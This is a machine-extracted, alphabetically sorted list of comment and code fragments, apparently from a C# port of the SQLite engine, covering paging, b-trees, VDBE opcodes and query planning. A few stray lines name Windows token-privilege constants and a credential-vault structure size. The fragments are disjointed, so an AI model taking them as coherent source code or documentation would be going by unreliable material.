 Shutdown the page cache.  Free all memory and close all files.
 Sign in to GitHub 
 Significant digits after the decimal point 
 Silence complaints from purify about yygotominor being uninitialized
 Silence some compiler warnings 
 Similar is true for Mac OS X.  LFS is only supported on Mac OS X 9 and later.
 Since there cannot be more than 2
 Single term in FROM clause 
 Single-instruction constants with a fixed destination are
 Size limit for persistent journal files 
 Size of a cell 
 Size of buffer pointed to by zHeader 
 Size of each buffer in bytes 
 Size of each free slot 
 Size of each object in the array 
 Size of each page in pPage[] 
 Size of each scratch buffer 
 Size of every page 
 Size of every page in this cache 
 Size of extra space for each page 
 Size of free slot 
 Size of journal file on disk 
 Size of master journal file 
 Size of name in zName[] 
 Size of output buffer in bytes 
 Size of pHeap[] 
 Size of pSpace[] in bytes 
 Size of scratch memory requested 
 Size of sibling on the left 
 Size of sibling on the right 
 Size of source db in pages 
 Size of struct Mem not including the Mem.zMalloc member.
 Size of subclassed sqlite3_file 
 Size of the Bitvec structure in bytes. 
 Size of the binary record 
 Size of the cell content header in bytes 
 Size of the cell content on the main b-tree page 
 Size of the column cache
 Size of the header 
 Size of the header size field at start of record 
 Size of the journal file in bytes 
 Size of the open journal file in bytes 
 Size of the original file in pages 
 Size of the output buffer 
 Size of the rowid 
 Size of the temporary register block 
 Size of zBuf[] in bytes 
 Size of zPattern 
 Size of zRep 
 Size of zStr 
 Sizes of the cells 
 Sizes of the cells bodie
 Skip leading zeros.  Ticket 
 Skip over leading zeros. Ticket 
 Skip this term for now.  We revisit it when we process the
 Skip unused indices 
 Sleep for a little while.  Return the amount of time slept.
 So as not to open security holes in older applications that are
 So create a fake list to simulate this.
 So define the lock related functions as no-ops.
 So do not write to the disk again.  Extract the root page number
 So extract the trunk page itself and use it as the newly
 So it needs to be freed here. Todo: Why not roll the temp schema into
 So make the cursor point at the old record.
 So the bitmap is usually sparse and has low cardinality.
 So the content cannot be trusted.  Do appropriate checks on the content.
 So we define our own static constants here using nothing
 So we have to define the macros in different ways depending on the
 So we must not search for built-ins when creating a new function.
 So we test the effects of a malloc() failing and the sqlite3OsXXX()
 Some API routines are omitted when various features are
 Some basic sanity checking 
 Some basic sanity checking on the Btree.  The list of Btrees
 Some combination of SQLITE_FUNC_
 Some compilers complain about constants of the form 0x7fffffffffffffff.
 Some interfaces require a protected sqlite3_value.  Other interfaces
 Some kind of disk I/O error occurred 
 Some microsoft compilers lack this definition.
 Some of the Debug.Assert() macros in this code are too expensive to run
 Some of the available extended result codes are listed here.
 Some of the definitions that are in this file are marked as
 Some systems have stricmp().  Others have strcasecmp().  Because
 Some views have defined column names 
 Someone else is in the process of initing the static mutexes 
 Something has gone awry. 
 Sometimes cursor numbers are used for a couple of different
 Sometimes this routine will return FALSE even if the two expressions
 Sometimes we need a small amount of code such as a variable initialization
 Somewhere on pPage is a pointer to page iFrom.  Modify this pointer so
 Sort all elements on the pEntry list of the RowSet into ascending order.
 Sort in ascending order 
 Sort order for this term 
 Sort order of primary key when pList==NULL 
 Sort the list of pages in accending order by pgno.  Pages are
 Source and destination indices 
 Source b-tree file 
 Source database handle 
 Source database name 
 Source files should 
 Source of new entry objects 
 Source page number 
 Source page object 
 Source pager 
 Source table 
 Space for copies of dividers cells 
 Space for new cursor 
 Space to buffer journal writes 
 Space to hold the KeyInfo structure is obtain from malloc.  The calling
 Space to hold the labels 
 Space to hold the returned string is obtained
 Space to hold the returned string is obtained from
 Space to hold the returned string is obtained from malloc.
 Space to hold the rollback journal is allocated in increments of
 Space to hold the virtual machine's program 
 Space to write cursor structure 
 Space used in zNewRecord[] 
 Spacer 
 Special case:  Add leading zeros if the flag_zeropad flag is
 Special case:  If op==TK_INTEGER and pToken points to a string that
 Special case: A DELETE without a WHERE clause deletes everything.
 Special case: If db->aVTrans is NULL and db->nVTrans is greater
 Special case: a WHERE clause that is constant.  Evaluate the
 Special handling is require for CREATE TRIGGER statements.
 Specific chunk into which cursor points 
 Specified database name already being used.
 Specify an alternative malloc implementation 
 Specify an alternative mutex implementation 
 Specify an alternative page cache implementation 
 Specify the key for an encrypted database.  This routine should be
 Split operator.  TK_AND or TK_OR 
 Split the WHERE clause into separate subexpressions where each
 SrcList might be the same as the SrcList that was input or it might be
 SrcList to be returned 
 SrcList_item.iCursor and Expr.iTable fields.  For any given WHERE
 Stack used by opcodes ContextPush 
 Standard function tolower() is implemented using the sqlite3UpperToLower[]
 Start a statement subtransaction. The subtransaction can can be rolled
 Start a write transaction on these databases 
 Start at the inner-most context and move outward until a match is found 
 Start of loop body 
 Start of memory holding result set 
 Start of range is constrained 
 Start of subroutine that outputs a result row 
 Start the view context
 Starter space for aArg[].  No malloc required 
 Starting offset in main journal 
 State information local to the memory allocation subsystem.
 State variables 
 State vector for the DB fixer 
 State:       
 Statement changes (Vdbe.nChanges)     
 Statement holding cursor open 
 Statement number (or 0 if has not opened stmt) 
 Statement subtransactions are used around individual SQL statements
 Static space for the 2 default backends 
 Status code 
 Status return flags 
 Status verb 
 Status verbs for [sqlite3_db_status()].
 Step 1. 
 Step 2. 
 Step 3 of header comment. 
 Step 3. 
 Step 4. Try to recycle a page buffer if appropriate. 
 Step the cursor to the back to the previous entry in the database.  If
 Stop accumulating errors when this reaches zero 
 Stop if out of errors 
 Stop reporting errors after this many 
 Stop the operation but leave all prior changes 
 Store 1 if the result is not empty 
 Store SELECT results in intermediate table 
 Store in register P2 an integer which is the key of the table entry that
 Store only the name 
 Store result as data with an automatic rowid 
 Store result as keys in an index 
 Store result in a memory cell 
 Store result in reg[P2] rather than jump 
 Store results as keys in an index 
 Store results here 
 Store the name and decltype 
 Store the number of entries (an integer value) in the table or index
 Store the result as data using a unique key.
 Store the result in register P3.
 Store the results.
 Store the string in memory obtained from sqliteMalloc() and make pz
 Store the token that zCsr points to in tname. 
 Store the token type in 
 Store the value of the P2-th column of
 Stored immediately after the three collation sequences is a copy of
 String Testing
 String defining the affinity of each column 
 String on RHS of LIKE operator 
 String or BLOB exceeds size limit 
 String or blob 
 String pointer 
 String rep is nul terminated 
 String value 
 String.IsNullOrEmpty(pDatabase.z))
 String.IsNullOrEmpty(pMem.z)) 
 Strings are simply reinterpreted as blobs with no change
 Strings with '
 Strings. %s 
 Structure allocated for each backup operation.
 Structure containing global configuration data for the SQLite library.
 Structure version number 
 Structures used by the virtual table interface
 Stub routines for all mutex methods.
 Subroutine for resetting the accumulator 
 Subsequent application-defined functions of the same name only override 
 Substitute expressions 
 Substitute the rowid (column -1) for the INTEGER PRIMARY KEY 
 Substitute values 
 Substring     
 Substructure is deleted.
 Subtotal of bytes in cells on one page 
 Subtract the value in register P1 from the value in register P2
 Success code from a subroutine 
 Successful result 
 Sum of nMaxPage for purgeable caches 
 Sum of nMinPage for purgeable caches 
 Suppose the action integer is N.  Then the action is determined as
 Suppose there are two processes A and B.  A has a read lock and B has
 Suppress error messages if VIEW already exists 
 Suppress errors if the trigger already exists 
 Suppress the the first OFFSET entries if there is an OFFSET clause
 Suppress warning about unused %extra_argument var 
 Suppress warning about unused %extra_argument variable 
 Suspicious pointer arithmetic 
 Swap all content between two VDBE structures.
 Swap the program counter with the value in register P1.
 Swap two objects of type TYPE.
 Symbol on the left-hand side of the rule 
 Sync all the db files involved in the transaction. The same call
 Sync the database file for the pager pPager. zMaster points to the name
 Sync the file.
 Sync the journal file if required. 
 Sync the journal file. If the atomic-update optimization is being
 Sync the master journal file. If the IOCAP_SEQUENTIAL device
 Sync the pager file to disk. This is a no-op for in-memory files
 Synchronous is on by default so database corruption is not
 System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM))
 System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)))
 Systems that support the isnan() library function should probably
 TABLE 
 TBD:  Insert subroutine calls to close cursors on incomplete
 TCLSH
 TEMP 
 TEMP database) has a transaction active.   There is no need for the
 TEMP triggers on pTab to the beginning of the pTab->pTrigger list
 TEMPORARY 
 TEMP_MASTER_NAME : MASTER_NAME )
 TERM_ANDINFO ) != 0 )
 TERM_ANDINFO ) ) == 0 )
 TERM_CODED )
 TERM_CODED ) ) != 0 ) continue
 TERM_CODED ) == 0 )
 TERM_COPIED )
 TERM_COPIED ) != 0 )
 TERM_DYNAMIC )
 TERM_DYNAMIC ) != 0 )
 TERM_DYNAMIC ){
 TERM_ORINFO 
 TERM_ORINFO ) != 0 )
 TERM_ORINFO ) ) == 0 )
 TERM_OR_OK ) == 0 ) continue
 TERM_VIRTUAL )
 TERM_VIRTUAL ) != 0 )
 TERM_VIRTUAL ) ) != 0 )
 TERM_xxx bit flags.  See below 
 TEST checks to see if an element is already in the RowSet.  SMALLEST
 TEXT 
 TF_Autoincrement )
 TF_Autoincrement ) != 0 )
 TF_Autoincrement ) == 0 )
 TF_Autoincrement)!=0
 TF_Ephemeral ) != 0 
 TF_Ephemeral ) != 0 )
 TF_HasPrimaryKey ) != 0 )
 TF_Readonly ) != 0
 TF_Virtual ) != 0 )
 TF_Virtual)!=0
 TF_Virtual)!=0 
 TF_Virtual)!=0 )
 TF_Virtual)!=0)
 TF_Virtual)==0
 TF_Virtual)==0 
 TF_Virtual)==0 ) return pDef
 THEN 
 THIS IS AN EXPERIMENTAL API AND IS SUBJECT TO CHANGE 
 THIS OVERRIDES OBSOLETE COMMENTS 1 AND 2 ABOVE:
 THREAD SAFETY NOTES:
 TK_AS operator.  The TK_AS operator causes the expression to be
 TK_COLUMN: column index.  -1 for rowid 
 TK_COLUMN: cursor number of table holding column
 TK_GE 
 TK_GT 
 TK_GT )
 TK_GT < TK_GE )
 TK_ID : TK_ILLEGAL
 TK_LE 
 TK_LE < TK_GE )
 TK_LT 
 TK_LT < TK_GE )
 TK_REGISTER: register number 
 TO 
 TODO
 TODO:  Add a test to make sure that the same column is not named
 TODO:  add collating sequence 
 TODO: Check if all of these are really required. 
 TODO: Is it really possible to get here with dbSizeValid==0
 TODO: Is it safe to use Pager.dbFileSize here
 TODO: Is this optimal
 TODO: Maybe it shouldn't be possible to change the ReadUncommitted
 TODO: Technically the following is an error because it assumes that
 TODO: This definition is just included so other modules compile. It
 TODO: This function allocates a single block of memory to load
 TODO: What if the cursor is in CURSOR_REQUIRESEEK but all table entries
 TODO: Why are these cleared here
 TODO: Why can we not reset the pager while in error state
 TOKEN_ADJUST_DEFAULT 
 TOKEN_ADJUST_GROUPS 
 TOKEN_ADJUST_PRIVILEGES 
 TOKEN_ADJUST_SESSIONID
 TOKEN_ASSIGN_PRIMARY 
 TOKEN_DUPLICATE 
 TOKEN_IMPERSONATE 
 TOKEN_QUERY
 TOKEN_QUERY 
 TOKEN_QUERY_SOURCE 
 TRACE
 TRANSACTION 
 TRANSACTION => nothing 
 TRANS_WRITE : TRANS_READ)
 TRIGGER 
 TRIGGER statement is replaced with the third argument and the result
 TRIGGER_AFTER ) != 0 
 TRIGGER_BEFORE ) != 0 )
 TRIGGER_BEFORE : TRIGGER_AFTER
 TRUE after OP_ColumnName has been issued to pVdbe 
 TRUE for a TEMPORARY view 
 TRUE if currently initializing 
 TRUE if p is a lookaside memory allocation from db
 TRUE will be returned after a call to sqlite3BtreeNext() moves
 Table <table>. 
 Table Name      Column Name     
 Table Name      Module Name     
 Table Name      NULL            
 Table associated with this expression 
 Table being altered 
 Table being renamed 
 Table column number 
 Table containing the row to be deleted 
 Table cursor are already open 
 Table cursor common to all terms 
 Table cursor number 
 Table for TK_COLUMN expressions. 
 Table has a primary key 
 Table has keys only - no data 
 Table has only 64-bit signed integer keys 
 Table holding the result of the SELECT 
 Table name 
 Table of WHERE clause constraints 
 Table of methods for JournalFile sqlite3_file object.
 Table of methods for MemJournal sqlite3_file object.
 Table p is a virtual table. This function moves all elements in the
 Table structure column is extracted from 
 Table that the trigger fires off of 
 Table that triggers are currently being coded on 
 Table this info block refers to 
 Table to append 
 Table to be indexed 
 Table to be opened 
 Table to be replaced 
 Table to be substituted 
 Table to index. Use pParse.pNewTable if 0 
 Table to open 
 Table to use for the distinct set 
 Table use masks 
 Table whose indices are to be analyzed 
 Table-name and function resolution occurs on the substituted expression
 Table.  No changes are made to disk by this routine.
 Table.nCol is the number of columns in this table.  Table.aCol is a
 Table.tnum is the page number for the root BTree page of the table in the
 Table.zName is the name of the table.  The case of the original
 Tables have different CHECK constraints.  Ticket 
 Tables that might satisfy case 1 
 Tail of unprocessed SQL 
 Take data to be written from here 
 Take the bit-wise AND of the values in register P1 and P2 and
 Take the bit-wise OR of the values in register P1 and P2 and
 Take the logical AND of the values in registers P1 and P2 and
 Take the logical OR of the values in register P1 and P2 and
 Target size for allocation chunks.
 Tell the code in notify.c that the connection no longer holds any
 Temp area for cell content 
 Temp db schema 
 Temp register 
 Temp register to free before returning 
 Temp space for pIdxKey - to avoid a malloc 
 Temp storage must have already been allocated 
 Temp var to store a page number in 
 Temporarily holds the number of cursors assigned 
 Temporary expression 
 Temporary files are named starting with this prefix followed by 16 random
 Temporary space used to build header 
 Temporary storage for the page 
 Temporary table associated with SELECT is populated 
 Temporary use register 
 Term j of the ORDER BY clause does not match column i of the index 
 Terminate the current execution of an SQL statement and reset it
 Terms in the GROUP BY or ORDER BY clauses of a SELECT statement.
 Terms in the SET clause of an UPDATE statement
 Terms in the VALUES clause of an INSERT statement
 Terms in the result set of a SELECT statement
 Terms of the WHERE clause are also used to limit which rows actually
 Terms that satisfy case 2 are candidates for lookup by using
 Test a register to see if it exceeds the current maximum blob size.
 Test all CHECK constraints
 Test all NOT NULL constraints.
 Test all UNIQUE constraints by creating entries for each UNIQUE
 Test operations are about 100 times more common that set operations.
 Test this expression 
 Test to make sure the linear array exactly matches the
 Test to see whether or not a table is a virtual table.  This is
 Test to see whether or not the database connection is in autocommit
 Tests show that this optimization can quadruple the speed of large
 Text encoding - one of the TEXT_Utf
 Text encoding handled by xCmp() 
 Text encoding used by this database 
 Text of all module args. [0] is module name 
 Text of the CREATE TABLE or CREATE VIEW statement 
 Text of the SQL statement that generated this 
 Text of the error report 
 Text of the join 
 Text of the new string 
 Text of the token.  Not NULL-terminated! 
 That gives a significant speed improvement. 
 The %Q option works like %q except it also adds single quotes around
 The %p conversion 
 The %q option works like %s in that it substitutes a null-terminated
 The 'state' variable is described in more detail along with the
 The 0x7ffff00 limit term is explained in comments on sqlite3Malloc() 
 The 1-byte case.  Overwhelmingly the most common.  Handled inline
 The 2-byte case 
 The 2nd register is the one that is returned.  That is all the
 The 3-byte case 
 The 32-bit integer value P1 is written into register P2.
 The 3rd template is for when the second template does not apply
 The 4th parameter to these callbacks is an array of pointers to
 The 4th template is used if the insert statement takes its
 The 6th parameter to db.xAuth callbacks 
 The ALWAYS and NEVER macros surround boolean expressions which
 The AND of all CHECK constraints 
 The BLOB is closed unconditionally.  Even if this routine returns
 The BTree 
 The BTree cursor 
 The BTree that contains the table 
 The BtShared this cursor points to 
 The BtShared.pHasContent bitvec exists to work around an obscure
 The Btree is sharable because only sharable Btrees are entered
 The Btree to which this cursor belongs 
 The C parameter to [sqlite3_close(C)] must be either a NULL
 The C-language implementation of SQL functions and aggregates uses
 The CHECK_FOR_INTERRUPT macro defined here looks to see if the
 The CHECK_PAGE macro takes a PgHdr
 The CREATE token that begins the statement 
 The CREATE token that begins this statement 
 The CollSeq.pUser member variable is an extra parameter that passed in
 The DB_SchemaLoaded flag is set after the database schema has been
 The Debug.Assert() below verifies the previous sentence.
 The EP_FromJoin property is used on terms of an expression to tell
 The Expr.iRightJoinTable tells the WHERE clause processing that the
 The FROM clause 
 The FROM clause of the outer query 
 The FROM clause of the subquery 
 The FROM clause term to search 
 The GROUP BY clause 
 The GROUP BY clause.  May be NULL 
 The GetProcAddressA() routine is only available on wince. 
 The HAVING clause 
 The HAVING clause.  May be NULL 
 The INSERT primitive might allocate additional memory.  Memory is
 The ISAUTOVACUUM macro is used within balance_nonroot() to determine
 The IdList.a.idx field is used when the IdList represents the list of
 The Incrblob.nByte field is fixed for the lifetime of the Incrblob
 The Index.onError field determines whether or not the indexed columns
 The KeyFetch() or DataFetch() above are fast and will get the entire
 The KeyInfo for addrOpenTran[0] and [1] contains collating sequences
 The LEMON-generated LALR(1) parser 
 The LHS of the IN operator 
 The LHS of the rule reduced 
 The LIMIT clause will jump out of the loop for us 
 The LIMIT clause will terminate the loop for us 
 The LIMIT clause.  May be null 
 The LIMIT expression.  NULL if there is no limit 
 The Lookaside structure holds configuration information about the
 The MEM structure is already a MEM_Real.  Try to also make it a
 The NNN value must be between 1 and the [sqlite3_limit()]
 The Name context of the SELECT statement is pNC.  zType is either
 The OFFSET clause.  May be null 
 The OFFSET expression.  NULL if there is none 
 The ON CONFLICT policy to be used for the trigger program steps is stored
 The ON clause of a join 
 The OP_Delete opcode always follows an OP_NotExists or OP_Last or
 The OP_OpenEphemeral for the sorting index 
 The OP_RowKey and OP_RowData opcodes always follow OP_NotExists or
 The OR-clause broken out into subterms 
 The ORDER BY and GROUP BY clauses may not refer to terms in
 The ORDER BY clause 
 The ORDER BY clause for compounds SELECT statements is handled
 The ORDER BY clause is ignored for all of the above 
 The ORDER BY clause.  May be NULL 
 The ORDER BY clause.  May be null 
 The ORDER BY or GROUP BY clause to be processed 
 The OS lock values must be the same as the Pager lock values 
 The P1 operand 
 The P2 operand 
 The P3 operand 
 The P3 register contains an integer record number. Call this record
 The P3 value is too large in magnitude to be expressed as an
 The P4 operand 
 The P4 parameter is not used 
 The P4 register values beginning with P3 form an unpacked index
 The P4 value is used by sqlite3_bind_parameter_name().
 The P4 value may be either an integer (P4_INT32) or a pointer to
 The P5 arguments are taken from register P2 and its
 The PGHDR_DONT_WRITE flag is set on the page.
 The PTRMAP_XXX identifiers below are the valid types.
 The Pager.sectorSize variable may have been updated while rolling
 The Parse structure 
 The RHS of the IN operator 
 The RowSet object is a collection of rowids.  Rowids
 The RowSet object is optimized for the case where successive sets
 The SELECT statement 
 The SELECT statement being coded 
 The SELECT statement being coded. 
 The SELECT statement containing the ORDER BY 
 The SELECT statement containing the clause 
 The SELECT statement holding pOrderBy 
 The SELECT statement to be fixed to one database 
 The SELECT statement with the ORDER BY clause 
 The SELECT was successfully coded.   Set the return code to 0
 The SET clause: list of column and new values 
 The SQL parser generates a program which is then executed by
 The SQL statement text in the 2nd parameter to [sqlite3_exec()]
 The SQL table being indexed 
 The SQL to be executed 
 The SQLITE_AFF_MASK portion of P5 must be an affinity character -
 The SQLITE_AFF_MASK values masks off the significant bits of an
 The SQLITE_CORRUPT_BKPT macro can be either a constant (for production
 The SQLITE_DEFAULT_MEMSTATUS macro must be defined as either 0 or 1.
 The SQLITE_IOCAP_ATOMIC property means that all writes of
 The SQLITE_MUTEX_NOOP implementation is a set of routines
 The SQLITE_OK result code will never be extended.  It will always
 The SQLITE_OPEN_NOMUTEX and SQLITE_OPEN_FULLMUTEX flags were
 The SQLITE_THREADSAFE macro must be defined as either 0 or 1.
 The SQLITE_VERSION and SQLITE_VERSION_NUMBER 
 The SQLite core  uses these three routines for all of its own
 The SQLite core uses these routines for thread
 The SQLite source code contains multiple implementations
 The SRT_ operation to apply to prior selects 
 The SUM() function follows the (broken) SQL standard which means
 The Schema.cache_size variable is not cleared.
 The Select object passed in has already been preprocessed and no
 The Source list to check and modify 
 The SrcList to be enlarged 
 The SrcList.a[].zName field is filled with the table name which might
 The TCL headers are only needed when compiling the TCL bindings.
 The TESTONLY macro is used to enclose variable declarations or
 The Table structure pParse.pNewTable was extended to include
 The Table structure pTable is really a VIEW.  Fill in the names of
 The Table ure that represents the result set was coned
 The TableLock structure is only used by the sqlite3TableLock() and
 The TryEnterCriticalSection() interface is only available on WinNT.
 The USING clause of a join 
 The VALUE clause: a list of values to be inserted 
 The VDBE 
 The VDBE already created by calling function 
 The VDBE cursor 
 The VDBE cursor for the index 
 The VDBE cursor for the table 
 The VDBE cursor number used to access this table 
 The VDBE cursor numbers are small integers contained in
 The VDBE cursor used by this IN operator 
 The VDBE cursor used to access pIdx 
 The VDBE cursor used to access the table 
 The VDBE has been deallocated 
 The VDBE knows that a P2 value is a label because labels are
 The VDBE must be in a particular state when this routine is called.
 The VDBE should have been allocated before this routine is called.
 The VDBE we are building 
 The VFS to use for actual file I/O 
 The VFS to use for this btree 
 The VM register number pParse->regRowid holds the rowid of an
 The VM under construction 
 The Vdbe.inVtabMethod variable is set to non-zero for the duration of
 The WHEN clause of the expression (may be NULL) 
 The WHERE clause 
 The WHERE clause for DELETE or UPDATE steps 
 The WHERE clause processing routine has two halves.  The
 The WHERE clause to be searched 
 The WHERE clause.  May be NULL 
 The WHERE clause.  May be null 
 The WhereClause to be initialized 
 The WhereLevel.wsFlags field is usually set to WO_IN
 The Windows OS interface layer calls
 The Windows errno from the last I/O error 
 The X expression 
 The X value is major version number always 3 in SQLite3.
 The X value only changes when backwards compatibility is
 The X==Ei expression 
 The Y value is the minor version number and only changes when
 The Z in X.Y.Z cannot be NULL 
 The Z value is the release number and is incremented with
 The [SQLITE_BUSY] error is converted to [SQLITE_IOERR_BLOCKED]
 The [SQLITE_FCNTL_LOCKSTATE] opcode is used for debugging.  This
 The [SQLITE_INTEGER 
 The [SQLITE_OPEN_DELETEONCLOSE] flag means the file should be
 The [SQLITE_OPEN_EXCLUSIVE] flag is always used in conjunction
 The [database connection] pointer D in a call to
 The [sqlite3_backup] object itself is partially threadsafe. Multiple 
 The [sqlite3_bind_zeroblob()] and [sqlite3_result_zeroblob()] interfaces
 The [sqlite3_blob_bytes()] interface returns the size of the BLOB in bytes.
 The [sqlite3_blob_read()] and [sqlite3_blob_write()] interfaces
 The [sqlite3_mutex_alloc()] interface takes a single argument
 The [sqlite3_next_stmt()] interface can be used to locate all
 The [sqlite3_set_authorizer 
 The [sqlite3_set_authorizer()] interface registers a callback function
 The [sqlite3_strnicmp()] API allows applications and extensions to
 The [sqlite3_value_blob 
 The [temp_store_directory pragma] may modify this variable and cause
 The [xBestIndex] method must fill aConstraintUsage[] with information
 The [xCreate] and [xConnect] methods of a
 The _base for radix conversion 
 The aArg[] array needs to grow. 
 The aConstraint[] array only reports WHERE clause terms in the correct
 The aConstraint[] array records WHERE clause constraints of the form:
 The aConstraints[] array contains entries for all constraints
 The above might be initialized to non-zero.  The following need to always
 The access authorization function is be called during the compilation
 The action table is constructed as a single large table named yy_action[].
 The actual data 
 The actual function that does the work of creating a new module.
 The address of an instruction 
 The affinity of the column or 0 if not a column 
 The affinity string for the record 
 The affinity to be applied 
 The aggregate accumulator is a set of memory cells that hold
 The aggregate function implementation 
 The alarm callback and its arguments.  The mem0.mutex lock will
 The alloca() routine never returns NULL.  This will cause code paths
 The allocateSpace() routine guarantees the following two properties
 The application does not need to worry about freeing the result.
 The application is responsible for serializing access to
 The application must not read or write any part of
 The application should never invoke either sqlite3_os_init()
 The application should never modify anything within the sqlite3_vfs
 The application-defined SQL function implementation will pass this
 The argument is the first in a linked list of dirty pages connected
 The argument list 
 The argument to this macro is a file descriptor (type sqlite3_file
 The arguments to a function have a fixed destination.
 The arguments to this routine should be the same as the first six
 The argv[0] element (which corresponds to memory cell P3)
 The array cannot be constant since changes are made to the
 The array is cleared after invoking the callbacks. 
 The arrows in the diagram above represent the Select.pPrior pointer.
 The associated database 
 The associated database connection 
 The associated pager.  Also accessible by pBt.pPager 
 The assumed sector size for this process 
 The attached database containing the blob 
 The author disclaims copyright to this source code.
 The author disclaims copyright to this source code.  In place of
 The authorization context 
 The authorizer callback is invoked as SQL statements are being compiled
 The authorizer callback must not do anything that will modify
 The authorizer is disabled by default.
 The auto-commit flag. 
 The auto-extension code added regardless of whether or not extension
 The backup process p has already copied page iPage. But now it
 The basic idea is that each page of the file contains N database
 The behavior of the most recently created foreign key is adjusted
 The best index is computed by the xBestIndex method of the virtual
 The binary operation 
 The binary record 
 The bit corresponding to the page-number is not set in
 The bitmask datatype defined below is used for various optimizations.
 The blocking transaction has been concluded. Or there never was a
 The boolean index is empty 
 The bottom of the loop
 The btree 
 The btree balancer needs additional memory beyond what is provided by
 The btree to be checked 
 The built-in NOCASE collating sequence 
 The built-in REVERSE collating sequence 
 The busy callback 
 The busy callback should not take any actions which modify the
 The bytes to be written 
 The cache is not required to perform any reference counting. A single 
 The cache sharing mode set by this interface effects all subsequent
 The call below sets the pName pointer to point at the token (pName1 or
 The call to sqlite3BtreeRollback() drops any table-locks held by
 The callback function registered by sqlite3_profile() is invoked
 The callback function registered by sqlite3_trace() is invoked at
 The callback function should register the desired collation using
 The callback implementation must not do anything that will modify
 The callback returns a UTF-8 rendering of the SQL statement text
 The caller discovers how much space needs to be allocated by
 The caller guarantees that there is sufficient space to make the
 The caller must ensure that pCur is pointing to a valid row
 The caller must ensure that the cursor is valid (has eState==CURSOR_VALID)
 The caller must guarantee that the cursor is pointing to a non-NULL
 The caller must position the cursor prior to invoking this routine.
 The calling function can detect the problem by looking at pParse.nErr
 The calling function might provide szSpace bytes of memory
 The calling function must ensure that p is a valid Bitvec object
 The calling function should use [sqlite3_free()] to free
 The calling procedure is responsible for deleting the compiled
 The calling routine must open a read/write cursor for pTab with
 The cases of the switch statement above this line should all be indented
 The cell content is not freed or deallocated.  It is assumed that
 The cell index.  First cell is 0 
 The cell pointer array begins on the first byte after the page header.
 The cell pointer array contains zero or more 2-byte numbers which are
 The cells are guaranteed to fit on the page.
 The changeCountDone flag is always set for temp-files 
 The changes are counted as soon as the statement that makes them is
 The charMap() macro maps alphabetic characters into their
 The check expression 
 The clause this term is part of 
 The cnt parameter is the number of slots.  If pStart is NULL the
 The code above will render a correct SQL statement in the zSQL
 The code generated by this routine store new index entries into
 The code generated follows one of four templates.  For a simple
 The code generated for this simpification gives the same result
 The code generator for compound SELECT statements does one
 The code in this file has been automatically generated by
 The code in this file implements a function that determines whether
 The code in this file implements execution method of the
 The code in this file is only used if we are compiling multithreaded
 The code in this file only exists if we are not omitting the
 The code that sqlite3WhereBegin() generates leaves the cursors named
 The code to implement this API is not available in the public release
 The code within this loop is run only once if the 'searchList' variable
 The collating sequence for the compound select is taken from the
 The collating sequence of pExpr 
 The collation sequence used by the comparison. If an index is to
 The collation type of the column or 0 
 The column affinity string will eventually be deleted by
 The column containing the blob 
 The column list presumably came from selectColumnNamesFromExprList().
 The columns of the result set 
 The columns of the table that are to be indexed are described
 The columns to change in the UPDATE statement 
 The comparison opcode 
 The complete IN operator 
 The complete hash table 
 The complete record text is always available for pseudo-tables
 The complete select statement being coded 
 The complex case - There is a multi-file write-transaction active.
 The computed column name 
 The condition (pIter.eLock!=eLock) in the following if(...)
 The content being read or written might appear on the main page
 The content of P3 registers starting at register P2 form
 The content of a cell looks like this:
 The content of the whole page 
 The contents of the structure are copied to an internal buffer by sqlite
 The context in which an SQL function executes is stored in an
 The context is pushed before executing a trigger a popped when the
 The conversion algorithms are implemented based on descriptions
 The converted number is in buf[] and zero terminated. Output it.
 The cookie changes its value whenever the database schema changes.
 The cookie mask contains one bit for each database file open.
 The correct SQL-92 behavior is for the LIKE operator to ignore
 The cost is not allowed to be larger than SQLITE_BIG_DBL (the
 The cost of a TEST using the same batch number is O(logN).  The cost
 The cost of an INSERT is roughly constant.  (Sometime new memory
 The count includes all changes from all 
 The counter 
 The ctype.h header is needed for non-ASCII systems.  It is also
 The current SQL statement 
 The current keylist is also stored in the context.
 The current value for the constraint is left in register iReg.
 The current value of the parameter is returned into 
 The current value of the requested counter is returned.
 The current value of the requested parameter is written into 
 The cursor can be either for reading or writing.
 The cursor for a virtual table 
 The cursor is always opened read/write even if
 The cursor number of the table 
 The cursor of the table 
 The cursor of the table to be accessed 
 The cursor pointing to the table 
 The cursor points to a BTree table if P4==0 and to a BTree index
 The cursor structure of the backend 
 The cursor to be moved 
 The cursor to compare against 
 The cursor will be left pointing at either the next or the previous
 The data 
 The data of the new record 
 The data or key is taken from the entry that pCur is currently pointing
 The data to be output is contained in pIn.iMem.  There are
 The database 
 The database being initialized 
 The database being vacuumed 
 The database connection
 The database connection 
 The database connection holding this Btree 
 The database connection must not be closed while
 The database connection that owns this statement 
 The database connection whose status is desired 
 The database containing table being inserted into 
 The database containing the table to be locked 
 The database disk image is malformed 
 The database encoding 
 The database file 
 The database file is locked 
 The database file to check 
 The database index in sqlite3.aDb[] 
 The database index number 
 The database name 
 The database of pDest 
 The database of pSrc 
 The database on which the SQL executes 
 The database page the PENDING_BYTE occupies. This page is never used.
 The database schema changed 
 The database structure 
 The database the table is being created in 
 The database to store the trigger in 
 The database we are looking in 
 The db.init.busy is 0 when the user first enters a CREATE INDEX
 The dbOrigSize is never set if journal_mode=OFF 
 The decimal point 
 The declaration type for any expression other than a column is NULL.
 The declaration type is the exact datatype definition extracted from the
 The default SQLite sqlite3_vfs implementations do not allocate
 The default behavior is for mutexes to be enabled.
 The default busy callback is NULL.
 The default cache size is stored in meta-value 2 of page 1 of the
 The default collating sequence (BINARY) 
 The default encoding for the database will be UTF-8 if
 The default implementation of the memory allocation subsystem uses
 The default location of PENDING_BYTE is the first byte past the
 The default memcmp() collating sequence 
 The default safety_level for the main database is 'full'
 The default size of a database page.
 The default size of a disk sector
 The default value for the soft heap limit is zero.
 The default value of a column is specified by a DEFAULT clause in the
 The default way of implementing this query is to execute the
 The definition of the function 
 The definition of the module 
 The details of the behavior of the sqlite3_step() interface depend
 The difference between a table and an index is this:  A table must
 The difference between this function and pager_write() is that this
 The difference between this operation and NotFound is that this
 The difference between this routine and sqlite3FindTable() is that this
 The direct Debug.Assignment in the previous line is possible only because
 The distinctive characteristic of this sqlite3_file is that the
 The doNotSync flag is set by the sqlite3PagerWrite() function while it
 The dupedExpr
 The dupedExprStructSize() function returns two values OR-ed together:
 The element that matches key 
 The element to be inserted 
 The element to be removed from the pH 
 The end of the for(
 The end of the loop 
 The entry into which pNew is inserted 
 The entry is identified by its MemPage and the index in
